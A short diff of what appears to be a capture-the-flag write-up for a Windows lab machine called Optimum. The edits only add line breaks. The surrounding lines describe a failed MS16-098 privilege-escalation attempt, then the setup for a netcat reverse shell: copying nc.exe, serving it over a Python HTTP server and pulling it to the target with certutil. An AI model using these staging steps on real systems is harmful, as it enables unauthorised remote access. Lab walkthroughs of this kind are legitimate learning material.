@@ -44,10 +44,10 @@ python2 windows-exploit-suggester.py --database 2022-07-17-mssb.xls
 I found out that this machine was vulnerable to MS16-098: </br>
 ![windows_exploit_suggester](images/optimum/windows_exploit_suggester.png) </br>
 **MS16-098:** </br>
-The exploit didn't work and my powershell session got stuck, So i tried using netcat, to send myself a proper CMD shell:
+The exploit didn't work and my powershell session got stuck, So i tried using netcat, to send myself a proper CMD shell: </br>
 **Kali Linux:** </br>
 1. I Copied the nc.exe binary to my working directory: ```cp /usr/share/windows-binaries/nc.exe . ```
-2. I Hosted a python http server with: ```python -m http.server 80```
+2. I Hosted a python http server with: ```python -m http.server 80``` </br>
 **Windows Target Machine:** </br>
 I used certutil to transfer the file from my Kali to the Windows machine:
 ```bash
